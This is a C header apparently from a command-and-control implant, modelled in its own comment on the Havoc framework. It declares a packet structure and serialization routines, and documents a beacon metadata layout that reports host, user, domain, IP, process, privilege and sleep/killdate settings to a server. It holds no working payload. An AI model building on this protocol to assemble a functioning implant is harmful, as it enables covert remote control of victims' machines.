#pragma once
#include <Windows.h>
#include <stdio.h>
#include "localcstd.h"
#include "implant.h"
#include "Operations.h"


enum package_return_values {
    PACKAGE_SUCCESS = 0,
    PACKAGE_FALIURE_GENERIC,
    PACKAGE_DOES_NOT_EXIST,
    PACKAGE_DATA_DOES_NOT_EXIST,
    PACKAGE_UNEXPECTED_DATA_SIZE,
    PACKAGE_BUFFER_REALLOC_FAILED,
    PACKAGE_BUFFER_DOES_NOT_EXIST,
    PACKAGE_POINTER_DOES_NOT_EXIST,
    PACKAGE_HAS_NOT_BEEN_SENT_TO_SERVER,
};


#define AES_BLOCKLEN 16


/*

Taken from havoc as a basic model.
     Header (if specified):
        [ SIZE         ] 4 bytes
        [ Magic Value  ] 4 bytes
        [ Agent ID     ] 4 bytes
        [ COMMAND ID   ] 4 bytes
        [ Request ID   ] 4 bytes

     MetaData:
        [ AES KEY      ] 32 bytes
        [ AES IV       ] 16 bytes
        [ Magic Value  ] 4 bytes
        [ Demon ID     ] 4 bytes
        [ Host Name    ] size + bytes
        [ User Name    ] size + bytes
        [ Domain       ] size + bytes
        [ IP Address   ] 16 bytes?
        [ Process Name ] size + bytes
        [ Process ID   ] 4 bytes
        [ Parent  PID  ] 4 bytes
        [ Process Arch ] 4 bytes
        [ Elevated     ] 4 bytes
        [ Base Address ] 8 bytes
        [ OS Info      ] ( 5 * 4 ) bytes
        [ OS Arch      ] 4 bytes
        [ SleepDelay   ] 4 bytes
        [ SleepJitter  ] 4 bytes
        [ Killdate     ] 8 bytes
        [ WorkingHours ] 4 bytes
        ..... more
        [ Optional     ] Eg: Pivots, Extra data about the host or network etc.
        
        */

typedef struct _Package {

    UINT32  RequestID;
    UINT32  CommandID;
    PVOID   Buffer;
    SIZE_T  Length;
    BOOL    Encrypt;
    BOOL    Destroy; /* destroy this package after Transmit */

    struct  _PACKAGE* Next;

}Package, * pPackage;


pPackage CreatePackage(UINT32 CommandID);
INT AddInt32ToPackage(pPackage pack, UINT32 data);
void AddInt32ToBuffer(PUCHAR buffer, UINT32 Data);

INT AddInt64ToPackage(pPackage pack, UINT64 data);
void AddInt64ToBuffer(PUCHAR buffer, UINT64 data);
INT AddBoolToPackage(pPackage pack, BOOLEAN data);
INT AddPtrToPackage(pPackage pack, PVOID pointer);
INT AddPaddingToPackage(pPackage pack, PCHAR data, SIZE_T size);
INT AddBytesToPackage(pPackage pack, PBYTE data, SIZE_T size);
INT AddStringToPackage(pPackage pack, PCHAR data);
INT AddWStringToPackage(pPackage pack, PWCHAR data);
INT DestroyPackage(pPackage pack);
LPSTR ErrorToString(INT error);